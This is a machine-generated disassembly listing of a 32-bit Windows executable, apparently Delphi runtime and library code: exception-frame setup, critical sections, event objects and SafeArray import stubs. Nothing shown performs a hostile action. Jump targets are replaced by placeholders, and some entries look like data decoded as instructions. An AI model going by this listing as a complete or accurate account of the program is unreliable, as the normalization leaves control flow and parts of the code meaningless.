jmp sub_4039ac
sub_40db74
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40dbe0
jmp sub_4039ac
sub_40dbe7
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dc50
jmp sub_4039ac
sub_40dc57
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dcc4
jmp sub_4039ac
sub_40dccb
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40e051
jmp sub_4039ac
sub_40e058
pop ebp
retn
sub_40e05c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40dd20
sub_40e06d
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e68e
jmp sub_4039ac
sub_40e695
pop ecx
pop ebp
retn
sub_40e727
jmp sub_4039ac
sub_40e72e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e77e
jmp sub_4039ac
sub_40e785
pop ecx
pop ebp
retn
sub_40e817
jmp sub_4039ac
sub_40e81e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e86e
jmp sub_4039ac
sub_40e875
pop ecx
pop ebp
retn
sub_40eabd
jmp sub_4039ac
sub_40eac4
pop ebx
mov esp ebp
pop ebp
retn
sub_40eb56
jmp sub_4039ac
sub_40eb5d
pop ecx
pop ebp
retn
sub_40eb60
push ebx
mov ebx eax
mov eax ebx
call sub_40edf8
mov [ ebx ] 0x1
pop ebx
retn
sub_40edf8
test [ eax ] 0xbfe8
jne r-xdata
call sub_40ed7c
retn
mov [ eax ] 0x0
retn
sub_40ee0c
push eax
call sub_40edf8
pop eax
retn
sub_40f06c
call sub_40f120
retn
sub_40f28a
jmp sub_4039ac
sub_40f291
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f335
jmp sub_4039ac
sub_40f33c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f35e
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4046a0
retn
sub_40f357
jmp sub_4039ac
sub_40f35e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f3ba
jmp sub_4039ac
sub_40f3c1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f43d
jmp sub_4039ac
sub_40f983
jmp sub_4039ac
sub_40f98a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fa1d
jmp sub_4039ac
sub_40fa24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fa41
lea eax [ ebp - 0x14 ]
call sub_404688
retn
sub_40fa3a
jmp sub_4039ac
sub_40fa41
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fa9e
jmp sub_4039ac
sub_40faa5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fb47
jmp sub_4039ac
sub_40fb64
jmp sub_4039ac
sub_40fb6b
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4100c6
jmp sub_4039ac
sub_4100cd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410178
push eax
call sub_40edf8
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_41018c
push eax
call sub_40edf8
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_410204
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f120
add esp 0x10
sub_4104ae
jmp sub_4039ac
sub_4104b5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4104f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40edf8
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_410510
mov edx 0x80020004
call sub_4104f8
retn
sub_4105a1
jmp sub_4039ac
sub_4105a8
pop esi
pop ebx
pop ebp
retn
sub_4105ac
push ebp
mov ebp esp
call sub_41076c
pop ebp
retn 0x4
sub_410638
push ebp
mov ebp esp
call sub_41076c
pop ebp
retn 0x4
sub_41071b
jmp sub_4039ac
sub_410722
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403248
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035cc
sub_410744
xor eax eax
retn
sub_410748
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_41075c
mov [ ecx ] 0x8
mov al 0x1
retn
sub_410764
call sub_40e644
retn
sub_41076c
call sub_40e734
retn
sub_410774
call sub_40eb0c
retn
sub_41077c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_410790
call sub_41076c
retn
sub_410798
push ebp
mov ebp esp
call sub_410774
pop ebp
retn 0x8
sub_4107b0
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_41088c
jmp sub_4039ac
sub_410955
jmp sub_4039ac
sub_41095c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410979
lea eax [ ebp - 0x10 ]
call sub_403fa8
retn
sub_410972
jmp sub_4039ac
sub_410979
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410984
call sub_40eb60
retn
sub_4109fb
jmp sub_4039ac
sub_410a02
pop ebp
retn
sub_410aa5
jmp sub_4039ac
sub_410aac
pop ebp
retn
sub_410bbd
jmp sub_4039ac
sub_410bc4
pop ebp
retn
sub_410bc8
sub [ rw-data ] 0x1
retn
sub_410bfc
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_410e80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403ffc
pop esi
pop ebx
retn
sub_410f1c
jmp sub_4039ac
sub_410f23
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41101e
jmp sub_4039ac
sub_411025
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411224
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f120
pop esi
pop ebx
retn
sub_4113a6
jmp sub_4039ac
sub_4113ad
pop ebp
retn
sub_4113b0
sub [ rw-data ] 0x1
retn
sub_4113dd
jmp sub_4039ac
sub_4113e4
pop ebp
retn
sub_4113e8
sub [ rw-data ] 0x1
retn
sub_411c9d
jmp [ eax - 0xfffbeba ]
sub_41277f
add [ esp + 0x4 ] 0xffffffd8
jmp sub_41a1fc
sub_412789
add [ esp + 0x4 ] 0xffffffd8
jmp sub_41a21c
sub_412793
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_412b00
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_412c24
mov eax [ eax + 0xc ]
call sub_413de8
retn
sub_412efb
jmp sub_4039ac
sub_412f02
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412f08
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413fa0
test eax eax
setge al
pop esi
pop ebx
retn
sub_41320b
jmp sub_4039ac
sub_413212
mov esp ebp
pop ebp
retn
sub_4132e0
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4132ec
push ebx
mov ebx edx
mov edx ebx
call sub_413100
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_412e60
sub_413398
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4134f3
jmp sub_4039ac
sub_4135c7
jmp sub_4039ac
sub_4135d8
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_413644
jmp sub_4039ac
sub_41364b
pop ebx
mov esp ebp
pop ebp
retn
sub_413696
jmp sub_4039ac
sub_41369d
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413729
jmp sub_4039ac
sub_413730
pop ebx
pop ebp
retn
sub_413776
jmp sub_4039ac
sub_41377d
pop ebx
pop ebp
retn
sub_4137c2
jmp sub_4039ac
sub_4137c9
pop ebx
pop ebp
retn
sub_413813
jmp sub_4039ac
sub_41381a
pop esi
pop ebx
pop ebp
retn
sub_41386e
jmp sub_4039ac
sub_413875
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4139a2
jmp sub_4039ac
sub_413a78
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_414088
sub_413b68
jmp sub_4039ac
sub_413cf2
jmp sub_4039ac
sub_413cf9
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413d93
jmp sub_4039ac
sub_413d9a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413db9
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_413db2
jmp sub_4039ac
sub_413db9
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_413e1c
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4140e4
xor edx edx
mov eax ebx
call sub_4140a8
pop ebx
retn
sub_413e94
mov eax [ ebp + 0x4 ]
retn
sub_413eca
pop ecx
pop edx
pop esi
pop ebx
retn
sub_413f18
jmp sub_4039ac
sub_413f1f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413f24
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_413f3c
xor edx edx
call sub_413f44
retn
sub_41402c
mov edx [ eax + 0x8 ]
dec edx
call sub_413f44
retn
sub_414154
retn
sub_41420e
jmp sub_4039ac
sub_414215
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035cc
sub_4142a4
jmp sub_4039ac
sub_4142ab
pop ebx
pop ecx
pop ebp
retn
sub_4142b0
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_414307
jmp sub_4039ac
sub_41430e
pop ebx
pop ecx
pop ebp
retn
sub_414314
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_414350
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
retn
sub_414368
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_414443
retn
sub_414444
cmp edx [ eax + 0x4 ]
jae sub_414350
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_414500
test edx edx
je r-xdata
xor edx edx
call sub_414514
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_4145ca
jmp sub_4039ac
sub_4145d1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4145e4
xchg edx eax
call sub_414514
retn
sub_4145ec
retn
sub_414685
jmp sub_4039ac
sub_41468c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4147d6
jmp sub_4039ac
sub_4148e6
jmp sub_4039ac
sub_4148ed
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41490a
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
sub_414903
jmp sub_4039ac
sub_41490a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414994
jmp sub_4039ac
sub_4149ac
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414a68
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414b11
jmp sub_4039ac
sub_414b18
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414b24
mov eax [ ebp + 0x4 ]
retn
sub_414b5a
pop ecx
pop edx
pop esi
pop ebx
retn
sub_414ba8
jmp sub_4039ac
sub_414baf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414c6e
jmp sub_4039ac
sub_414c75
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c97
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fcc
retn
sub_414c90
jmp sub_4039ac
sub_414c97
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414ca0
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_414ca8
xor eax eax
retn
sub_414cf1
jmp sub_4039ac
sub_414cf8
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_414e0b
jmp sub_4039ac
sub_414e12
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414ea0
jmp sub_4039ac
sub_414ea7
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414f77
jmp sub_4039ac
sub_414f7e
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415034
jmp sub_4039ac
sub_41503b
pop esi
pop ecx
pop ebp
retn
sub_4150c0
jmp sub_4039ac
sub_4150c7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4150e4
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
sub_4150dd
jmp sub_4039ac
sub_4150e4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415170
jmp sub_4039ac
sub_41518d
jmp sub_4039ac
sub_415194
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4151d0
retn
sub_415253
jmp sub_4039ac
sub_41525a
mov eax [ ebp - 0x8 ]
call sub_417ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41527f
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
sub_415278
jmp sub_4039ac
sub_41527f
mov esp ebp
pop ebp
retn
sub_4152cf
jmp sub_4039ac
sub_4152d6
pop esi
pop ecx
pop ebp
retn
sub_415329
jmp sub_4039ac
sub_415330
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415338
retn
sub_4153b3
jmp sub_4039ac
sub_4153ba
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415457
jmp sub_4039ac
sub_41545e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41547b
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
sub_415474
jmp sub_4039ac
sub_41547b
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415480
retn
sub_4154fa
jmp sub_4039ac
sub_415501
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415508
mov eax edx
mov edx ecx
call sub_407de0
retn
sub_415514
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41552c
sub_4155a4
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_415614
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_415630
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_415824
mov eax [ eax + 0x18 ]
retn
sub_415828
mov eax [ eax + 0x14 ]
retn
sub_4158c4
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_415ad0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_4026fc
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_415b0c
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_415b24
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_415b38
mov edx sub_415b24
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_415b80
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407de0
retn
mov eax edx
mov edx ecx
call sub_407da8
retn
sub_415c1c
retn
sub_415f14
jmp sub_4039ac
sub_415f1b
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_415f7c
jmp sub_4039ac
sub_415f83
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415fc8
mov eax [ eax + 0x4 ]
call sub_40841c
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415fd8
mov eax [ eax + 0x4 ]
call sub_408448
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_416014
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_4161bd
jmp sub_4039ac
sub_41621c
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_4162ac
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4162fc
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_416617
jmp sub_4039ac
sub_41661e
mov esp ebp
pop ebp
retn
sub_4166c8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
retn
sub_416750
mov [ eax + 0x18 ] edx
retn
sub_4168cc
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_410d9c
retn
sub_416953
jmp sub_4039ac
sub_41695a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416a06
jmp sub_4039ac
sub_416a0d
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_416bb1
jmp sub_4039ac
sub_416c03
jmp sub_4039ac
sub_416c22
jmp sub_4039ac
sub_416c29
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416c48
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_416c41
jmp sub_4039ac
sub_416c48
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416ceb
jmp sub_4039ac
sub_416d73
jmp sub_4039ac
sub_416d80
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
pop ebx
retn
sub_416d98
mov eax [ rw-data ]
call sub_416d80
retn
sub_416dd0
push ebx
call sub_410c54
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_416d98
sub_416f3d
jmp sub_4039ac
sub_416f44
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403fa8
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_417064
jmp sub_4039ac
sub_41706b
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417162
jmp sub_4039ac
sub_41717f
jmp sub_4039ac
sub_417186
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417284
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_415b9c
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_417348
push ebx
mov ebx eax
mov eax ebx
call sub_418cfc
cmp al 0x9
sete al
pop ebx
retn
sub_4173a7
jmp sub_4039ac
sub_4173ae
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_417454
jmp sub_4039ac
sub_41745b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4176da
jmp sub_4036f8
sub_417706
jmp sub_4036f8
sub_4177a8
jmp sub_4036f8
sub_41784b
jmp sub_4036f8
sub_417a23
jmp sub_4036f8
sub_417a65
jmp sub_4039ac
sub_417a95
jmp sub_4039ac
sub_417a9c
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417b0b
jmp sub_4039ac
sub_417be2
jmp sub_4039ac
sub_417be9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417ebc
mov dl 0x1
call sub_416e24
retn
sub_417ffd
jmp sub_4039ac
sub_418004
pop ebx
mov esp ebp
pop ebp
retn
sub_41800c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_418e0c
mov eax [ rw-data ]
call sub_416d80
pop ebp
retn
j_sub_403824#3
jmp sub_403824
j_sub_403824#2
jmp sub_403824
sub_4181b2
add [ eax ] eax
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ esi - 0x76ffbe7f ] bh
retn
sub_4181f8
jmp sub_4039ac
sub_4181ff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4182df
jmp sub_4039ac
sub_4182e6
mov esp ebp
pop ebp
retn
sub_41839e
jmp sub_4039ac
sub_4183a5
pop ecx
pop ecx
pop ebp
retn
sub_4186a7
jmp sub_4039ac
sub_4186ae
pop ebx
mov esp ebp
pop ebp
retn
sub_418953
jmp sub_4039ac
sub_41895a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403258
retn
sub_418973
jmp sub_4039ac
sub_418997
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4036f8
sub_4189ce
jmp sub_4036f8
sub_418a0d
jmp sub_4039ac
sub_418a14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a36
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403fcc
retn
sub_418a2f
jmp sub_4039ac
sub_418a36
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418abd
jmp sub_4036f8
sub_418aea
jmp sub_4039ac
sub_418af1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418afc
push ecx
mov edx esp
mov ecx 0x4
call sub_4172c0
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_416d80
sub_418c09
jmp sub_4039ac
sub_418c10
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418cef
jmp sub_4039ac
sub_418cf6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418d4c
jmp sub_4039ac
sub_418d53
pop ebx
pop ecx
pop ebp
retn
sub_418f9b
jmp sub_4039ac
sub_418fa2
pop ecx
pop ecx
pop ebp
retn
sub_418fe5
jmp sub_4039ac
sub_418fec
pop ebx
pop ecx
pop ebp
retn
sub_419088
jmp sub_4039ac
sub_41908f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41913d
jmp sub_4039ac
sub_419144
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419150
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4193ab
jmp sub_4039ac
sub_4193b2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193d7
mov eax [ ebp - 0x8 ]
call sub_403258
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_4193d0
jmp sub_4039ac
sub_4193d7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193fc
lea eax [ ebp - 0x1c ]
call sub_4056c4
lea eax [ ebp - 0x18 ]
call sub_403fa8
retn
sub_4193f5
jmp sub_4039ac
sub_4193fc
pop ebx
mov esp ebp
pop ebp
retn
sub_41960e
jmp sub_4039ac
sub_419615
pop ebx
mov esp ebp
pop ebp
retn
sub_419668
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_415e00
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_419680
test dl dl
je r-xdata
mov dl 0x8
call sub_419804
retn
mov dl 0x9
call sub_419804
retn
sub_419708
mov dl 0x1
call sub_419804
retn
sub_419710
xor edx edx
call sub_419804
retn
sub_4197f5
jmp sub_4039ac
sub_4197fc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419818
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40ccf4
sub_41984c
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_419864
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_419870
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_419864
sub_419996
jmp sub_4036f8
sub_4199c5
jmp sub_4039ac
sub_4199fb
jmp sub_4039ac
sub_419a02
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a21
push rw-data
call LeaveCriticalSection
retn
sub_419a1a
jmp sub_4039ac
sub_419a21
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419af0
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_419ccc
sub_419b50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417e0c
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_419b64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417e0c
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_419b78
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_419694
retn
sub_419b84
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_419694
retn
sub_419e2c
xor eax eax
retn
sub_419e30
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_419e38
xor eax eax
retn
sub_419e3c
retn
sub_419e40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403ffc
pop esi
pop ebx
retn
sub_419e54
mov eax [ eax + 0x4 ]
retn
sub_419e58
retn
sub_419e5c
xor eax eax
retn
sub_419e60
retn
sub_419e64
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_419e70
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_419e7c
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_419e88
retn
sub_419e8c
xchg edx eax
call sub_417ab0
retn
sub_419e94
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_419f1c
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403454
pop esi
retn
sub_419f30
retn
sub_41a010
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403ffc
pop esi
pop ebx
retn
sub_41a050
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_41a19c
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4034a0
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_41a1b4
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_41a23c
retn
sub_41a284
retn
sub_41a2bc
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41a2d4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41a4f8
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403454
pop esi
pop ebx
retn
